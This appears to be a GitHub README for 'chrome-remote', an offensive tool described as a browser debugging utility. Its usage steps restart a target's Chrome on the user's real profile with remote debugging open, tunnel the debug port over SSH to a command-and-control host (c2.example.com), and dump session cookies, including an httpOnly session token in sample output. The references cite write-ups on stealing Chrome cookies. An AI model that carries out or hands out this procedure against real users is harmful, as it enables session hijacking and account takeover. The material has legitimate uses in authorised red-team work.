# chrome-remote

> Utility for remote debugging of Google Chrome, Microsoft Edge and other Chromium-based browsers.

# Setup

Install with [pipx](https://github.com/pypa/pipx).

~~~ bash
pipx install git+https://github.com/dadevel/chrome-remote.git
~~~

# Usage

Restart the browser with remote debugging enabled.

~~~ powershell
Get-Process chrome | Stop-Process
Start-Process 'C:\Program Files\Google\Chrome\Application\chrome.exe' -ArgumentList '--user-data-dir="C:\Users\jdoe\AppData\Local\Google\Chrome\User Data" --restore-last-session --remote-debugging-port=9222 --remote-allow-origins=*'
~~~

Then forward `localhost:9222` back to your machine.

~~~ powershell
ssh.exe -R 127.0.0.1:9222:127.0.0.1:9222 proxy@c2.example.com
~~~

Now you can access the browser over the remote debugging protocol and, for example, list open tabs and installed extensions.

~~~ bash
chrome-remote list-tabs
chrome-remote list-extensions
~~~

Or dump session cookies.

~~~ bash
❯ chrome-remote dump-cookies | jq -r '.[]|select(.domain == "example.com")'
{
  "name": "sessid",
  "value": "SFE0R1REZFF0NFZCVTlMbEdSTEN5QXcxZloyS0tDVDg=",
  "domain": "example.com",
  "path": "/",
  "expires": -1,
  "size": 44,
  "httpOnly": true,
  "secure": true,
  "session": true,
  "sameSite": "None",
  "priority": "Medium",
  "sameParty": false,
  "sourceScheme": "Secure",
  "sourcePort": 443
}
...
~~~

# References

- [Stealing Chrome cookies without a password](http://web.archive.org/web/20240616123506/https://mango.pdf.zone/stealing-chrome-cookies-without-a-password)
- [Post-Exploitation: Abusing Chrome's debugging feature to observe and control browsing sessions remotely](http://web.archive.org/web/20240521025448/https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [Hands in the Cookie Jar: Dumping Cookies with Chromium’s Remote Debugger Port](http://web.archive.org/web/20240624212635/https://scribe.rip/@specterops/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [cookie_crimes](https://github.com/defaultnamehere/cookie_crimes)
- [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut)
- [Debugging Cookie Dumping Failures with Chromium’s Remote Debugger](http://web.archive.org/web/20230721071951/https://scribe.rip/@slyd0g/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) and [ripWCMN.py](https://gist.github.com/slyd0g/955e7dde432252958e4ecd947b8a7106#file-ripWCMN-py)
- [Chrome DevTools Protocol Documentation](https://chromedevtools.github.io/devtools-protocol/tot/Storage/)
